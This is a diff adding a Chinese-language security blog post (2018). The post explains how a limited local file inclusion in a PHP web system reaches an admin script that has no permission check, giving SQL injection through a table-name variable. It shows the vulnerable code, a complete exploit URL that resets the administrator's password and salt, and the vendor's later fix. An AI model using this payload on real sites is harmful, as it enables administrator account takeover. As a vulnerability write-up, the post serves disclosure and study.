@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>鸡肋LFI导致的SQL注入 - x1a0t&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content=PHP,SQLI,LFI>
+  
+  
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.02">
+  
+  
+    <link rel="alternate" href="/atom.xml " title="x1a0t&#39;s Blog" type="application/atom+xml">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">x1a0t&#39;s Blog</a>
+    <div class="subtitle"></div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/links" class="menu-item-link">Links</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/notes" class="menu-item-link">Notes</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/about" class="menu-item-link">About</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+<article class="post">
+  <div class="post-title">
+    <h1 class="article-title">鸡肋LFI导致的SQL注入</h1>
+  </div>
+   <div class="post-meta">
+    <span class="post-time">2018-09-21</span>
+    
+      <ul class="post-tag-list" itemprop="keywords"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/SQLI/" rel="tag">SQLI</a></li></ul>
+    
+  </div>
+  <div class="post-content">
+    <p>用来填坑的文章，漏洞也比较有趣，简单写下漏洞产生过程</p>
+<h1 id="GO"><a href="#GO" class="headerlink" title="GO"></a>GO</h1><p>该系统下有个<code>global_page.php</code>，通过使用文件包含的方式进入不同的应用，<code>inlcude</code>中后缀指定了为php，也就是说我们只能控制除后缀外的部分。由于文件中存在多处鸡肋包含，给出部分代码如下&#x2F;inc&#x2F;global_page.php：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$tp</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&quot;/&quot;</span>,<span class="variable">$p</span>);</span><br><span class="line"><span class="variable">$p</span>=<span class="title function_ invoke__">count</span>(<span class="variable">$tp</span>)&gt;<span class="number">1</span>?<span class="variable">$tp</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$tp</span>)-<span class="number">1</span>]:<span class="variable">$p</span>;</span><br><span class="line"><span class="variable">$pp</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&quot;-&quot;</span>,<span class="variable">$p</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span>= <span class="variable">$ym_cats</span>[<span class="variable">$p</span>] ? <span class="variable">$p</span> : <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;-&#x27;</span>.<span class="variable">$pp</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$pp</span>)-<span class="number">1</span>],<span class="string">&#x27;&#x27;</span>,<span class="variable">$p</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(cache_data.<span class="string">&quot;diy&quot;</span>.Ext)) &#123;</span><br><span class="line">	<span class="keyword">include</span>(cache_data.<span class="string">&quot;diy&quot;</span>.Ext); <span class="comment">//引入全局缓存</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ym_module</span> = <span class="keyword">array</span>(<span class="string">&#x27;index&#x27;</span>,<span class="string">&#x27;cart&#x27;</span>, <span class="string">&#x27;user&#x27;</span>,<span class="string">&#x27;apidata&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$p</span>, <span class="variable">$ym_module</span>)) </span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;action&quot;</span>])!=<span class="string">&#x27;&#x27;</span>)&#123; </span><br><span class="line">		@<span class="keyword">include</span>(<span class="string">&quot;./inc/lib/&quot;</span>.<span class="title function_ invoke__">trim</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;action&quot;</span>]).Ext);<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">require</span>(<span class="string">&quot;./inc/module/&quot;</span>.<span class="variable">$p</span>.Ext); </span><br><span class="line">	@<span class="keyword">include</span> <span class="title function_ invoke__">template</span>(<span class="variable">$p</span>, <span class="variable">$ym_tpl</span>.<span class="string">&quot;/&quot;</span>);<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据之前的想法，我们得去包含危险php文件，这样更容易产生漏洞。<br>通过浏览文件发现，后台文件中普遍都加上了权限检测的代码，类似如下这种：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;in_mx&#x27;</span>)) &#123;<span class="keyword">exit</span>(<span class="string">&#x27;Access Denied&#x27;</span>);&#125;</span><br><span class="line">  </span><br><span class="line"> <span class="title function_ invoke__">checkAuth</span>(<span class="variable">$login_id</span>, <span class="string">&#x27;app&#x27;</span>);<span class="comment">//权限检测 </span></span><br></pre></td></tr></table></figure>
+
+<p>但也漏掉了几处文件，而且巧的是刚好这几处文件可导致漏洞。先看下代码&#x2F;inc&#x2F;admin_inc&#x2F;post&#x2F;batch.order.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;in_mx&#x27;</span>)) &#123;<span class="keyword">exit</span>(<span class="string">&#x27;Access Denied&#x27;</span>);&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$h_id</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">update</span>(<span class="string">&#x27;&#x27;</span>.<span class="variable">$kktype</span>, <span class="keyword">array</span>(<span class="string">&#x27;c_order&#x27;</span> =&gt; <span class="title function_ invoke__">intval</span>(<span class="variable">$c_order</span>[<span class="variable">$i</span>])), <span class="keyword">array</span>(<span class="string">&#x27;id&#x27;</span> =&gt; <span class="variable">$h_id</span>[<span class="variable">$i</span>]));</span><br><span class="line">	<span class="comment">//echo $c_order.&quot; , &quot;;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//update_config($site_id,$site_mo,$site_url);</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">message</span>(<span class="string">&quot;更新排序完成。&quot;</span>,<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们包含成功后，通过update进行操作，通过该系统的全局变量注册机制，可控制<code>$kktype</code>变量，即table表名，达到注入的效果。有趣的是，刚好这样的注入点还可以绕过系统中的webscan360代码，还不用去猜测表前缀。</p>
+<p>那么最好的利用方法，就是去修改管理员的密码。虽然系统对密码有加盐处理，方式是<code>md5(md5(trim($val)).$salt)</code>，那么构造一下修改管理员密码为xiaot的payload:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xxx.xxx/index.php?p=index&amp;action=../admin_inc/post/batch.order&amp;h_id[0]=1&amp;c_order[0]=1&amp;kktype=user set salt=0x616161616161,pwd=md5(0x3264623532353530663263656530366466343832323061303338626362613035616161616161) where id%3d1%23</span><br></pre></td></tr></table></figure>
+
+<p>高兴的去提交给补天，结果被告知被大佬抢先了一步orz</p>
+<h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><p>在最新的版本中该系统对所有这样的包含点进行了替换处理，替换掉了输入中<code>.</code>，代码类似如下：<code>@include(&quot;./inc/lib/&quot;.str_replace(&quot;.&quot;,&quot;&quot;,$_REQUEST[&quot;action&quot;]).Ext);exit();</code></p>
+
+  </div>
+  <div class="post-footer">
+    <a href="#top" class="top">Post.Top</a>
+  </div>
+</article>
+<footer>
+  &copy; 2024
+  <span class="author">
+    x1a0t
+  </span>
+</footer>
+    </div>
+  </body>
+</html>
